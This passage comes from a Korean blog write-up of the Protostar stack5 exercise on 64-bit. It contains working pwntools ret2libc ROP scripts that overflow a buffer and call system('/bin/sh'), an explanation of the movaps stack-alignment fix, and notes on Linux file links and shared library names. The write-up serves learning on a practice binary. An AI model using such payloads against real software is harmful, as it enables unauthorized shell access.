&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb.attach(process({program_name}))&lt;/code&gt;를 이용해 스크립트에서 돌리는 프로그램에 gdb를 붙이도록 했고, gdb를 붙인 프로그램이 미처 반응하기도 전에 실행되고 끝나버리는 상황을 방지하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raw_input(”1”)&lt;/code&gt; 코드를 삽입했다. 위 스크립트를 실행하면 gdb 창이 뜨는데, 그때 브레이크 포인트를 설정하고 원래 터미널 창에 1을 입력한 후 gdb 창에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 를 누르면 디버깅을 할 수 있다.&lt;/p&gt;

&lt;p&gt;브레이크 포인트 설정 시 콜스택을 잘 확인해야 한다. 이미 실행되었던 인스트럭션에 브레이크 포인트를 설정하는 바보짓은 절대 엄금이다! &lt;em&gt;그렇다. 내가 바로 그 바보다! 안녕하세요 반갑습니다 바보 1입니다&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수를 콜하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수는 거의 끄트머리에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 함수를 콜하면서 인자를 넘겨주는 형식이다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수 내부로 들어갔을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 를 콜하기도 전에 SEGFAULT가 나는 이유를 알아내는 것이 현재 디버깅의 목적이다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;를 누르고 보면 위 부분에서 rip가 freezed 된 것이 보인다.&lt;/p&gt;

&lt;p&gt;대관절 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 가 뭐냐 싶다.  검색해본 결과, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 는 64 비트 프로그램의 Calling convention을 지켜주고자 도입된 인스트럭션으로, 스택 주소가 16의 배수로 딱딱 떨어지게 데이터가 담겨있는 게 아니면 앞으로의 함수 콜에 심각한 문제가 생길 것을 우려해 프로그램을 멈추게 만드는 인스트럭션이다.&lt;/p&gt;

&lt;p&gt;지금 문제가 된 인스트럭션을 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps xmmword ptr [rsp + 0x40], xmm0&lt;/code&gt; 이라고 되어 있는데, xmm0라는 레지스터는 SIMD 연산에 사용되는 전용 레지스터인데, SIMD(Single Instruction Multi Data)라는 이름에서도 알 수 있듯 한 레지스터에 4개의 데이터를 한꺼번에 집어넣을 수 있는 레지스터이다. 지금은 중요하지 않으니 그냥 넘어가자. 중요한 것은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmmword ptr [rsp + 0x40]&lt;/code&gt; 이다. 현재 보이는 컨텍스트의 아랫부분에 표현된 스택을 확인하면, rsp의 위치는 끝이 8로 끝나기 때문에 8의 배수이지만 16의 배수는 아니다. 여기에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x40&lt;/code&gt; 을 더한 스택의 위치는 역시 8의 배수이지만 16의 배수는 아니다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 인스트럭션의 종료 조건에 딱 들어맞는 상황이다.&lt;/p&gt;

&lt;p&gt;이런 상황은 사실 ROP 공격을 하지 않았다면 발생하지 않았을 상황이다. 그리고 ROP 공격을 할 때 가장 자주 맞닥뜨리는 pitfall 이기도 하다. 조금 더 자세한 설명은 &lt;a href=&quot;https://ropemporium.com/guide.html&quot;&gt;이쪽을 참고하자.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;말이 거창했는데, 해결법은 간단하다. 내가 rsp 주소를 마음대로 바꾸다가 rsp 주소가 16의 배수가 아닌 8의 배수가 되도록 만들어 놨으니, rsp가 한 칸(8 bytes)을 더 내려가든 올라가든 하도록 하면 된다. 이 때 딱히 페이로드 구조를 크게 바꾸지 않고 rsp가 한 칸(8 bytes) 더 이동하도록 하는 제일 쉬운 방법은 ret를 처음에 하나 끼워넣는 것이다.&lt;/p&gt;

&lt;p&gt;즉 페이로드는 아래와 같은 형태가 된다.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ret add에 있는 인스트럭션의 주소로 rip를 옮겨놓으니 또 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;을 하래서 rsp가 가리키는 주소에 있는 주소값을 rip에 넣어주니 이번엔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt;가 기다리고 있는 형식이다.&lt;/p&gt;

&lt;p&gt;위와 같은 페이로드를 보내기 위해 스크립트를 아래와 같이 변형했다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# raw_input(&quot;1&quot;)
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;스크립트 실행 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-삽질이-남긴-지식&quot;&gt;3. 삽질이 남긴 지식&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot;&gt;3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정&lt;/h2&gt;

&lt;p&gt;먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 이랑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 썼다며? 그런데 왜 정작 사용된 건 다른 거야??&lt;/p&gt;

&lt;h3 id=&quot;311-file-link&quot;&gt;3.1.1. File Link&lt;/h3&gt;

&lt;p&gt;이에 관해서는 리눅스의 soft link와 linker의 동적 라이브러리 호출에 대해 안다면 답을 알 수 있다.&lt;/p&gt;

&lt;p&gt;먼저 리눅스에는 파일 링크라는 시스템이 있는데, 이는 윈도우의 바로가기와 상당히 비슷하다. 이 파일 링크는 첫째, 하드 링크(Hard Link)와 둘째, 소프트 링크(Soft Link or Symbolic Link) 두 개 종류로 나뉘는데, 둘의 차이점은 원본 파일과 동일한 inode를 가지느냐, 다른 inode를 가지느냐이다. inode에 관해서는 os를 공부했다면 알 수 있는지라 자세히 설명하진 않겠지만 파일 시스템 상에서 파일을 호출할 때 참고하는 inode table상의 index 번호 정도로 설명을 퉁치고 넘어가려 한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;하드 링크는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln {original file} {linked file}&lt;/code&gt; 명령어로 생성한다. 이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; 명령어로 inode를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 동일함을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌더라도 링크된 파일을 실행하면 원본 파일이 실행된다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;소프트 링크는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln -s {original file} {linked file}&lt;/code&gt; 명령어로 생성한다. 이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; 명령어로 inode와 파일 정보를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 다르며, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; 기호로 링크가 표시되어 있음을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌면 링크된 파일을 실행했을 때 링크가 원본 파일을 찾지 못한다. 아래 사진은 소프트 링크를 확인했을 때의 사진이다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;가장 첫 번째에 보이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816882&lt;/code&gt; 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816904&lt;/code&gt; 로 서로 다르다는 것을 확인할 수 있다.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;좋아, 그렇다면 파일 실행 시 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 썼기 때문에 소프트 링크의 오리지널 파일인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 사용됐고 &lt;strong&gt;Dynamic Loader&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 를 썼기 때문에 링크가 걸린 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용됐다고 치자. (아래 사진 참고)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;그런데 또 궁금한 게 생긴다. so 파일이 뭔지는 알겠는데… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.2&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.6&lt;/code&gt;은 대체 무슨 뜻이야?&lt;/p&gt;

&lt;h3 id=&quot;312-gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot;&gt;3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위&lt;/h3&gt;

&lt;p&gt;결론적으로 말하자면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so&lt;/code&gt; 파일은 해당 라이브러리의 대표 호칭 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;이고,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.2&lt;/code&gt; 등 뒤에 숫자가 붙은 파일은 해당 라이브러리의 하위 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 이다.&lt;/p&gt;

&lt;p&gt;라이브러리에는 정적 라이브러리(&lt;em&gt;.a)와 동적(공유) 라이브러리(&lt;/em&gt;.so) 두 종류가 존재한다는 건 아마 이 블로그쯤 온 사람들이라면 알음알음 알 것이므로 생략한다. 윈도우에서는 동적 라이브러리로 *.dll 파일을 쓴다는 건… 쓰고 싶으니까 쓸거다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;컴파일 시의 행위:
    &lt;ul&gt;
      &lt;li&gt;프로그램 컴파일 시 트리거된 링커는 컴파일러와 프로그램을 참고해 필요한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;을 가진 라이브러리를 찾아내고, 해당 라이브러리의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt;을 읽어온다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;파일 실행 시의 행위:
    &lt;ul&gt;
